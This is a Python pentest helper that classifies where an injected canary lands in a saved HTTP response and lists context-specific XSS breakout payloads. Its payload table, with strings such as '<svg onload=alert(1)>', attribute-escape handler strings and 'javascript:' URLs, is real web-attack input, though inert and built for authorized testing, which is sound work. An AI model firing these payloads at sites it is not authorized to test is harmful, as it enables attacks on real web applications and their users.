#!/usr/bin/env python3
"""xss_context.py - classify the injection context of a reflected marker.

Offline tool: feed it a saved HTTP response (or body) and the marker string
you injected (a canary like rj-pt-<engagement>-<nonce>). It locates the
marker, classifies the surrounding context (html-body / attribute
double|single|unquoted / js-string / js-template / js-code / url scheme|param
position / html-comment) with simple parser heuristics, and prints the
breakout candidate list for exactly that context.

Usage:
  python3 xss_context.py --response resp.txt --marker rj-pt-eng1-ab12

Exit codes: 0 = marker found and classified; 1 = marker not found, missing
file, or unreadable input. No network access; no scope guard needed (offline
analysis of already-captured evidence).

Evidence expectation: the response file you analyze IS the evidence pair's
response half; keep it as evidence/p5-xss-<surface>-<seq>.resp.txt.
"""

import argparse
import os
import re
import sys
import tempfile

URL_ATTRS = {
    "href", "src", "action", "formaction", "poster", "background", "cite",
    "data", "longdesc", "lowsrc", "dynsrc", "usemap", "xlink:href", "manifest",
    "archive", "codebase", "profile",
}

# canonical inert breakouts per context (alert(1)-class only)
BREAKOUTS = {
    "html-body": [
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<script>alert(1)</script>   (last resort; CSP often blocks)",
    ],
    "attr-double": [
        '" autofocus onfocus=alert(1) x="',
        '" onmouseover=alert(1) x="',
    ],
    "attr-single": [
        "' autofocus onfocus=alert(1) x='",
        "' onmouseover=alert(1) x='",
    ],
    "attr-unquoted": [
        "onfocus=alert(1) autofocus",
        "onmouseover=alert(1) x=y",
    ],
    "js-string": [
        "'-alert(1)-'   (single-quoted string)",
        '"-alert(1)-"   (double-quoted string)',
        "\\';alert(1);//   (when the app backslash-escapes quotes)",
        '\\";alert(1);//   (double-quote variant)',
    ],
    "js-template": [
        "${alert(1)}",
    ],
    "js-code": [
        ";alert(1);//",
    ],
    "url-scheme": [
        "javascript:alert(1)//   (only when the value feeds navigation/src)",
    ],
    "url-param": [
        "&n=<svg onload=alert(1)>   (URL-encode once: "
        "%26n%3D%3Csvg%20onload%3Dalert%281%29%3E)",
    ],
    "html-comment": [
        "--!><svg onload=alert(1)>",
    ],
}


def split_http(raw):
    """Return the body of a raw HTTP response, or the input unchanged."""
    for sep in ("\r\n\r\n", "\n\n"):
        idx = raw.find(sep)
        if idx != -1 and raw[: idx].upper().startswith("HTTP/"):
            return raw[idx + len(sep):]
    return raw


def _script_context(before):
    seg_start = max(before.rfind("<script"), before.rfind("</script"))
    seg = before[seg_start:]
    if seg.count("`") % 2 == 1:
        return "js-template", "inside a backtick template literal in <script>"
    if seg.count("'") % 2 == 1:
        return "js-string", "inside a single-quoted JS string in <script>"
    if seg.count('"') % 2 == 1:
        return "js-string", "inside a double-quoted JS string in <script>"
    return "js-code", "raw JS statement context in <script>"


def _attr_context(before):
    lt = before.rfind("<")
    gt = before.rfind(">")
    tag_before = before[lt:]
    if tag_before.lstrip("<").startswith("!--"):
        return "html-comment", "inside an HTML comment"
    if tag_before.count('"') % 2 == 1:
        quote = '"'
    elif tag_before.count("'") % 2 == 1:
        quote = "'"
    else:
        quote = ""
    if quote == '"':
        pat = r'([A-Za-z_:][-.\w:]*)\s*=\s*("[^"]*)$'
    elif quote == "'":
        pat = r"([A-Za-z_:][-.\w:]*)\s*=\s*('[^']*)$"
    else:
        pat = r"([A-Za-z_:][-.\w:]*)\s*=\s*([^\s<>]*)$"
    m = re.search(pat, tag_before)
    attr = (m.group(1) or "").lower() if m else "(unknown)"
    value_so_far = m.group(2) if m else ""
    if attr in URL_ATTRS:
        bare = value_so_far.lstrip("\"'")
        if bare == "" or re.match(r"^[a-zA-Z][\w+.-]*$", bare):
            return ("url-scheme",
                    "marker at the URL scheme start of attribute '%s'" % attr)
        if "://" in bare or bare.startswith(("/", "?", "&", "#")):
            return ("url-param",
                    "inside the URL value of attribute '%s' (path/query part)"
                    % attr)
    kind = {"\"": "double-quoted", "'": "single-quoted", "": "unquoted"}[quote]
    return "attr-" + {"\"": "double", "'": "single", "": "unquoted"}[quote], \
        "inside the %s value of attribute '%s'" % (kind, attr)


def classify(body, marker):
    """Return (context_key, human_detail) or None when marker is absent."""
    idx = body.find(marker)
    if idx == -1:
        return None
    before = body[:idx]
    script_open = before.rfind("<script")
    script_close = before.rfind("</script")
    if script_open > script_close:
        return _script_context(before)
    lt = before.rfind("<")
    gt = before.rfind(">")
    if lt > gt:
        return _attr_context(before)
    return "html-body", "between tags, in HTML text"


def report(body, marker):
    result = classify(body, marker)
    if result is None:
        return None
    context, detail = result
    lines = [
        "[marker] found at offset %d" % body.find(marker),
        "[context] %s (%s)" % (context, detail),
        "[breakout] candidates for this context (canonical, inert):",
    ]
    for payload in BREAKOUTS.get(context, ["(no candidates defined)"]):
        lines.append("  - %s" % payload)
    lines.append("[note] encode-decode ladder: raw -> URL-encode once -> "
                 "URL-encode twice -> unicode/%00; record the rung that works.")
    lines.append("[note] send exactly one candidate at a time (P5 "
                 "discipline); wrong-context payloads are log noise.")
    lines.append("[evidence] keep this response plus the matching request as "
                 "evidence/p5-xss-<surface>-<seq>.{req,resp}.txt")
    return context, "\n".join(lines)


# ---------------------------------------------------------------- self-test

FIXTURES = [
    ("<html><body>Hello NAMEMARK user</body></html>", "NAMEMARK", "html-body"),
    ('<input value="NAMEMARK">', "NAMEMARK", "attr-double"),
    ("<input value='NAMEMARK'>", "NAMEMARK", "attr-single"),
    ("<input value=NAMEMARK>", "NAMEMARK", "attr-unquoted"),
    ('<a href="https://example.com/r?next=NAMEMARK">go</a>', "NAMEMARK",
     "url-param"),
    ('<a href="NAMEMARK">go</a>', "NAMEMARK", "url-scheme"),
    ('<script>var x = "NAMEMARK";</script>', "NAMEMARK", "js-string"),
    ("<script>var x = 'NAMEMARK';</script>", "NAMEMARK", "js-string"),
    ("<script>var t = `NAMEMARK`;</script>", "NAMEMARK", "js-template"),
    ("<script>var v = NAMEMARK;</script>", "NAMEMARK", "js-code"),
    ("<!-- NAMEMARK -->", "NAMEMARK", "html-comment"),
]

HTTP_FIXTURE = (
    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"
    "<div title=\"NAMEMARK\">x</div>"
)


def self_test():
    for body, marker, expected in FIXTURES:
        result = classify(body, marker)
        assert result is not None, "marker not found in fixture: %r" % body
        context = result[0]
        assert context == expected, "fixture %r -> %s (expected %s)" % (
            body, context, expected)
    # raw HTTP response: body extraction works
    body = split_http(HTTP_FIXTURE)
    assert "HTTP/1.1" not in body and "<div" in body
    assert classify(body, "NAMEMARK")[0] == "attr-double"
    # plain body passthrough
    assert split_http("<p>x</p>") == "<p>x</p>"
    # marker absent -> None
    assert classify("<html>no marker here</html>", "NAMEMARK") is None
    # report renders candidates for every classified context
    for body, marker, _expected in FIXTURES:
        context, text = report(body, marker)
        assert context in BREAKOUTS, "missing breakout list for %s" % context
        assert "[breakout]" in text and "[evidence]" in text

    # file-loading path through a temp fixture (no network)
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "resp.txt")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(HTTP_FIXTURE)
        with open(path, "r", encoding="utf-8") as fh:
            loaded = fh.read()
        assert classify(split_http(loaded), "NAMEMARK")[0] == "attr-double"

    print("[self-test] xss_context: %d fixtures + http-split + missing-marker "
          "+ report checks passed" % len(FIXTURES))


# ---------------------------------------------------------------- cli


class _Parser(argparse.ArgumentParser):
    def error(self, message):
        self.print_usage(sys.stderr)
        sys.stderr.write("error: %s\n" % message)
        sys.exit(1)


def main():
    parser = _Parser(
        description="Classify XSS injection context of a reflected marker "
                    "(offline).")
    parser.add_argument("--response", help="saved HTTP response or body file")
    parser.add_argument("--marker", help="the marker/canary you injected")
    parser.add_argument("--self-test", action="store_true",
                        help="run offline self-test (fixtures) and exit")
    args = parser.parse_args()

    if args.self_test:
        self_test()
        return

    if not args.response or not args.marker:
        parser.error("--response and --marker are required")
    try:
        with open(args.response, "r", encoding="utf-8", errors="replace") as fh:
            raw = fh.read()
    except OSError as err:
        sys.stderr.write("[error] cannot read %s: %s\n" % (args.response, err))
        sys.exit(1)

    body = split_http(raw)
    result = report(body, args.marker)
    if result is None:
        sys.stderr.write(
            "[error] marker %r not found in %s; re-run the reflection probe "
            "and save the response first\n" % (args.marker, args.response))
        sys.exit(1)
    print(result[1])


if __name__ == "__main__":
    main()
